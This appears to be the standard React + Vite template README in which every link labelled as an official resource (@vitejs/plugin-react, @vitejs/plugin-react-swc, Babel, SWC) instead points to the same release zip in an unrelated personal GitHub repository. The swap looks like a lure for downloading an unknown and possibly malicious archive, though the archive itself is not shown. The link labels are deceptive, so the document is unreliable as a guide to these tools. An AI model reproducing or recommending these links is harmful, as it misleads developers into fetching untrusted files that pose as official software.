# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/ChrisJustice600/blog-react/releases/download/3.8.6/blog-react.v3.8.6.zip) uses [Babel](https://github.com/ChrisJustice600/blog-react/releases/download/3.8.6/blog-react.v3.8.6.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/ChrisJustice600/blog-react/releases/download/3.8.6/blog-react.v3.8.6.zip) uses [SWC](https://github.com/ChrisJustice600/blog-react/releases/download/3.8.6/blog-react.v3.8.6.zip) for Fast Refresh
